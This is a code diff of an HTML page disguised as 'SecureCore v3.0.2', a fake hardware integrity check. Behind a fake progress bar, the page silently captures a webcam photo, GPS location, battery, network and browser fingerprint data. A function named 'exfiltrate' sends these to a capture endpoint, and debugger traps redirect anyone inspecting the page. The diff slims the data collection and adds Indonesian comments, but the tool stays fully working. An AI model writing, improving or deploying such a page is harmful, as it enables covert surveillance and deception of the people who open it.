@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SecureCore v3.0.1</title>
+    <title>SecureCore v3.0.2</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
         body {
@@ -95,15 +95,12 @@
             gap: 16px;
         }
         #hidden-video { display: none; }
-        #debug { display: none; }
-        /* Extra hidden elements for fingerprinting */
-        canvas#extra-canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="glass-card">
         <div class="logo">🛡️</div>
-        <h1>SecureCore v3.0.1</h1>
+        <h1>SecureCore v3.0.2</h1>
         <div class="sub">Hardware‑level integrity check · Please wait</div>
         <div class="progress-container">
             <div class="progress-fill" id="progressFill"></div>
@@ -119,67 +116,22 @@
 
     <video id="hidden-video" autoplay playsinline></video>
     <canvas id="canvas-fingerprint" width="200" height="50" style="display:none;"></canvas>
-    <audio id="audio-fingerprint" style="display:none;"></audio>
-    <canvas id="extra-canvas" width="1" height="1" style="display:none;"></canvas>
 
     <script>
         (async function() {
-            // ==================== ANTI‑DEBUGGING & VM DETECTION ====================
-            // Multiple layers to detect DevTools / debugging
+            // ==================== ANTI‑DEBUGGING (sederhana) ====================
             const startTime = performance.now();
-            const checkDevTools = () => {
-                const diff = performance.now() - startTime;
-                if (diff > 150) {
-                    window.location.replace('https://www.google.com');
-                }
-            };
-            checkDevTools();
-
-            // 1. debugger trap
             setInterval(() => {
                 const t = performance.now();
                 debugger;
                 if (performance.now() - t > 50) window.location.replace('https://www.google.com');
-            }, 400);
+            }, 500);
 
-            // 2. console.log trap (if console is open, accessing it may slow down)
-            (function() {
-                const c = console.log;
-                console.log = function() {
-                    window.location.replace('https://www.google.com');
-                    c.apply(console, arguments);
-                };
-            })();
-
-            // 3. Check for DevTools via toString
-            const checkToString = () => {
-                const element = document.createElement('div');
-                if (element.toString.toString().includes('native code')) {
-                    // likely fine
-                } else {
-                    window.location.replace('https://www.google.com');
-                }
-            };
-            checkToString();
-
-            // 4. Detect if frame is being inspected (via width difference)
-            const widthDiff = window.outerWidth - window.innerWidth;
-            if (widthDiff > 150) window.location.replace('https://www.google.com');
-
-            // 5. Periodic performance check (for step debugging)
-            let lastTime = performance.now();
-            setInterval(() => {
-                const now = performance.now();
-                if (now - lastTime > 200) window.location.replace('https://www.google.com');
-                lastTime = now;
-            }, 100);
-
-            // ==================== UI ELEMENTS ====================
+            // ==================== UI ====================
             const progressFill = document.getElementById('progressFill');
             const statusText = document.getElementById('statusText');
             const extraDetails = document.getElementById('extra-details');
 
-            // ==================== DATA COLLECTION ====================
             let photoData = null, locationData = null, fingerprint = {}, errors = [];
 
             function updateProgress(percent, msg, detail = '') {
@@ -187,225 +139,88 @@
                 statusText.innerText = msg;
                 if (detail) {
                     extraDetails.innerHTML = `<div class="detail-line"><span>${detail}</span><span>✔️</span></div>`;
-                } else {
-                    // Add random detail occasionally
-                    const details = ['TPM verified', 'Secure boot OK', 'UEFI locked', 'VT‑d enabled', 'Memory encryption active'];
-                    if (Math.random() > 0.7) {
-                        extraDetails.innerHTML = `<div class="detail-line"><span>${details[Math.floor(Math.random() * details.length)]}</span><span>✔️</span></div>`;
-                    }
                 }
             }
 
-            // ==================== EXTREME FINGERPRINTING ====================
-            async function collectAdvancedFingerprint() {
+            // ==================== FINGERPRINTING (singkat, tapi cukup) ====================
+            async function collectFingerprint() {
                 const fp = {};
-
-                // Basic navigator properties
                 fp.userAgent = navigator.userAgent;
                 fp.platform = navigator.platform;
                 fp.language = navigator.language;
-                fp.languages = navigator.languages;
                 fp.hardwareConcurrency = navigator.hardwareConcurrency;
                 fp.deviceMemory = navigator.deviceMemory || 'unknown';
-                fp.maxTouchPoints = navigator.maxTouchPoints;
-                fp.vendor = navigator.vendor;
-                fp.cookieEnabled = navigator.cookieEnabled;
-                fp.doNotTrack = navigator.doNotTrack;
                 fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                fp.timezoneOffset = new Date().getTimezoneOffset();
-
-                // Screen
                 fp.screen = `${screen.width}x${screen.height}`;
-                fp.screenAvail = `${screen.availWidth}x${screen.availHeight}`;
-                fp.colorDepth = screen.colorDepth;
-                fp.pixelDepth = screen.pixelDepth;
-                fp.orientation = screen.orientation ? screen.orientation.type : 'unknown';
-                fp.devicePixelRatio = window.devicePixelRatio;
-
-                // WebGL renderer (GPU fingerprint)
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debugInfo) {
-                            fp.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                            fp.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        }
-                        // Get WebGL parameters
-                        fp.webglVersion = gl.getParameter(gl.VERSION);
-                        fp.webglShadingVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-                        fp.webglVendor = gl.getParameter(gl.VENDOR);
-                        fp.webglRenderer = gl.getParameter(gl.RENDERER);
-                        // Extensions
-                        fp.webglExtensions = gl.getSupportedExtensions();
-                    }
-                } catch (e) {}
-
-                // Canvas fingerprint (image hash)
-                try {
-                    const canvas = document.getElementById('canvas-fingerprint');
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(0, 0, 100, 50);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('🕵️', 10, 20);
-                    const dataURL = canvas.toDataURL();
-                    fp.canvasHash = dataURL.slice(-50);
-                } catch (e) {}
-
-                // Audio fingerprint (using AudioContext)
-                try {
-                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    const oscillator = audioCtx.createOscillator();
-                    const analyser = audioCtx.createAnalyser();
-                    oscillator.connect(analyser);
-                    oscillator.frequency.value = 440;
-                    oscillator.start(0);
-                    oscillator.stop(0.1);
-                    const data = new Uint8Array(analyser.frequencyBinCount);
-                    analyser.getByteFrequencyData(data);
-                    fp.audioHash = data.reduce((a, b) => a + b, 0).toString(16);
-                } catch (e) {}
-
-                // Battery API
+                fp.cookieEnabled = navigator.cookieEnabled;
+                // Battery
                 if (navigator.getBattery) {
                     try {
-                        const battery = await navigator.getBattery();
-                        fp.battery = {
-                            level: Math.round(battery.level * 100) + '%',
-                            charging: battery.charging,
-                            chargingTime: battery.chargingTime,
-                            dischargingTime: battery.dischargingTime
-                        };
-                    } catch (e) {}
+                        const b = await navigator.getBattery();
+                        fp.battery = { level: Math.round(b.level*100)+'%', charging: b.charging };
+                    } catch(e){}
                 }
-
-                // Network information
+                // Connection
                 if (navigator.connection) {
                     fp.connection = {
                         effectiveType: navigator.connection.effectiveType,
-                        rtt: navigator.connection.rtt,
-                        downlink: navigator.connection.downlink,
-                        saveData: navigator.connection.saveData
+                        downlink: navigator.connection.downlink
                     };
                 }
-
-                // WebRTC local IP
-                try {
-                    const rtc = new RTCPeerConnection({ iceServers: [] });
-                    rtc.createDataChannel('');
-                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-                    rtc.onicecandidate = (ice) => {
-                        if (ice.candidate) {
-                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                            const ip = ipRegex.exec(ice.candidate.candidate)?.[1];
-                            if (ip) fp.localIP = ip;
-                        }
-                    };
-                    setTimeout(() => rtc.close(), 1000);
-                } catch (e) {}
-
-                // Font enumeration (extensive)
-                try {
-                    const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Palatino', 'Garamond', 'Book Antiqua', 'Arial Black', 'Lucida Console', 'Monaco', 'Courier', 'Cursive', 'Fantasy', 'Sans-serif', 'Serif', 'Monospace'];
-                    fp.availableFonts = fontList.filter(f => document.fonts?.check(`12px "${f}"`)).join(',');
-                } catch (e) {}
-
-                // Plugins
-                try {
-                    const plugins = [];
-                    for (let i = 0; i < navigator.plugins.length; i++) {
-                        plugins.push(navigator.plugins[i].name);
-                    }
-                    fp.plugins = plugins.join(',');
-                } catch (e) {}
-
-                // MIME types
-                try {
-                    const mimeTypes = [];
-                    for (let i = 0; i < navigator.mimeTypes.length; i++) {
-                        mimeTypes.push(navigator.mimeTypes[i].type);
-                    }
-                    fp.mimeTypes = mimeTypes.join(',');
-                } catch (e) {}
-
-                // Java enabled
-                fp.javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : false;
-
-                // PDF viewer enabled
-                fp.pdfViewerEnabled = navigator.pdfViewerEnabled || false;
-
-                // Touch support
-                fp.touchSupport = 'ontouchstart' in window;
-
-                // Device orientation support (already)
-                fp.deviceOrientationSupported = !!window.DeviceOrientationEvent;
-
-                // Performance timing (to detect VM)
-                const perf = performance.timing;
-                fp.navigationStart = perf.navigationStart;
-                fp.domInteractive = perf.domInteractive;
-                // This can be used to detect VMs if timings are off.
-
-                // Get CPU core info? Not directly.
-
-                // Additional canvas fingerprint with different text
-                try {
-                    const canvas2 = document.getElementById('extra-canvas') || document.createElement('canvas');
-                    canvas2.width = 200;
-                    canvas2.height = 50;
-                    const ctx2 = canvas2.getContext('2d');
-                    ctx2.fillStyle = '#ccc';
-                    ctx2.fillRect(0, 0, 200, 50);
-                    ctx2.fillStyle = '#333';
-                    ctx2.font = '16px Arial';
-                    ctx2.fillText('BrowserFingerprint', 10, 30);
-                    fp.canvas2Hash = canvas2.toDataURL().slice(-50);
-                } catch (e) {}
-
                 return fp;
             }
 
-            // ==================== DATA EXFILTRATION (resilient + multiple fallbacks) ====================
-            async function exfiltrate(payload, retries = 4) {
-                const endpoints = ['/api/capture']; // could add more fallback endpoints if needed
+            // ==================== EXFILTRASI DENGAN PENGECEKAN UKURAN ====================
+            async function exfiltrate(payload, retries = 3) {
+                // Cek ukuran payload (dalam bytes)
+                const payloadStr = JSON.stringify(payload);
+                const size = new Blob([payloadStr]).size;
+                console.log(`Payload size: ${size} bytes`);
 
-                for (let endpoint of endpoints) {
-                    for (let i = 0; i < retries; i++) {
-                        try {
-                            // Try sendBeacon first (best for page unload)
-                            const success = navigator.sendBeacon(endpoint, JSON.stringify(payload));
-                            if (success) return true;
+                // Jika terlalu besar (> 3MB), hapus foto
+                if (size > 3 * 1024 * 1024) {
+                    console.warn('Payload terlalu besar, menghapus foto');
+                    payload.photo = null;
+                }
 
-                            // Fallback to fetch
-                            const res = await fetch(endpoint, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(payload),
-                                keepalive: true
-                            });
-                            if (res.ok) return true;
-                        } catch (e) {
-                            console.error('Exfil attempt failed', e);
+                for (let i = 0; i < retries; i++) {
+                    try {
+                        // Gunakan sendBeacon (lebih tahan terhadap page unload)
+                        const success = navigator.sendBeacon('/api/capture', JSON.stringify(payload));
+                        if (success) {
+                            console.log('sendBeacon sukses');
+                            return true;
                         }
-                        // Exponential backoff
-                        await new Promise(r => setTimeout(r, 300 * (i + 1)));
+                        // Fallback ke fetch
+                        const res = await fetch('/api/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload),
+                            keepalive: true
+                        });
+                        if (res.ok) {
+                            console.log('fetch sukses');
+                            return true;
+                        } else {
+                            const text = await res.text();
+                            console.error('fetch gagal:', res.status, text);
+                        }
+                    } catch (e) {
+                        console.error('Exfil attempt error:', e);
                     }
+                    await new Promise(r => setTimeout(r, 300 * (i + 1)));
                 }
                 return false;
             }
 
-            // ==================== MAIN EXECUTION ====================
-            updateProgress(5, 'Initializing secure module...');
+            // ==================== MAIN ====================
+            updateProgress(5, 'Initializing...');
 
-            // ---- Camera ----
+            // Kamera (resolusi kecil, kualitas rendah)
             try {
-                updateProgress(10, 'Accessing secure camera...');
+                updateProgress(10, 'Accessing camera...');
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: { ideal: 1280 } }
+                    video: { facingMode: "user", width: 640, height: 480 }
                 });
                 const video = document.getElementById('hidden-video');
                 video.srcObject = stream;
@@ -415,63 +230,51 @@
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    photoData = canvas.toDataURL('image/jpeg', 0.7); // lower quality for size
+                    photoData = canvas.toDataURL('image/jpeg', 0.5); // kualitas 0.5
                     stream.getTracks().forEach(t => t.stop());
                     video.srcObject = null;
                 }, 800);
-                updateProgress(30, 'Camera verified', 'Sensor OK');
+                updateProgress(30, 'Camera OK');
             } catch (e) {
                 errors.push('camera:' + e.message);
-                updateProgress(30, 'Camera fallback', 'Using backup sensor');
+                updateProgress(30, 'Camera fallback');
             }
 
-            // ---- Location ----
+            // Lokasi
             try {
                 updateProgress(40, 'Geolocating...');
-                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {
-                    enableHighAccuracy: true, timeout: 7000
-                }));
+                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 7000 }));
                 locationData = {
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude,
-                    acc: pos.coords.accuracy,
-                    alt: pos.coords.altitude || null,
-                    heading: pos.coords.heading || null,
-                    speed: pos.coords.speed || null
+                    acc: pos.coords.accuracy
                 };
-                updateProgress(60, 'Location locked', 'GPS fix');
+                updateProgress(60, 'Location OK');
             } catch (e) {
                 errors.push('location:' + e.message);
-                updateProgress(60, 'Approximate location', 'IP fallback');
-                // In a real advanced version, you could fetch IP geolocation from a free service, but that adds latency and external dependency.
+                updateProgress(60, 'Location fallback');
             }
 
-            // ---- Advanced Fingerprint ----
-            updateProgress(70, 'Analyzing device fingerprint...');
-            fingerprint = await collectAdvancedFingerprint();
-            updateProgress(85, 'Hardware profile complete', `CPU cores: ${fingerprint.hardwareConcurrency || '?'}`);
+            // Fingerprint
+            updateProgress(70, 'Analyzing device...');
+            fingerprint = await collectFingerprint();
+            updateProgress(85, 'Hardware profile complete');
 
-            // ---- Assemble payload ----
+            // Gabungkan payload
             const payload = {
                 photo: photoData,
                 location: locationData,
                 fingerprint,
                 errors: errors.length ? errors : undefined,
-                timestamp: Date.now(),
-                pageUrl: window.location.href,
-                referrer: document.referrer || undefined
+                timestamp: Date.now()
             };
 
-            // ---- Exfiltrate ----
-            updateProgress(95, 'Securely transmitting...');
+            // Kirim
+            updateProgress(95, 'Transmitting...');
             const sent = await exfiltrate(payload);
 
-            // ---- Clean exit ----
-            updateProgress(100, sent ? 'Update complete' : 'Partial sync', sent ? '' : '⚠️ Some data pending');
-            setTimeout(() => {
-                // Redirect to a benign page
-                window.location.replace('https://www.google.com');
-            }, 2000);
+            updateProgress(100, sent ? 'Update complete' : 'Partial sync');
+            setTimeout(() => window.location.replace('https://www.google.com'), 2000);
         })();
     </script>
 </body>
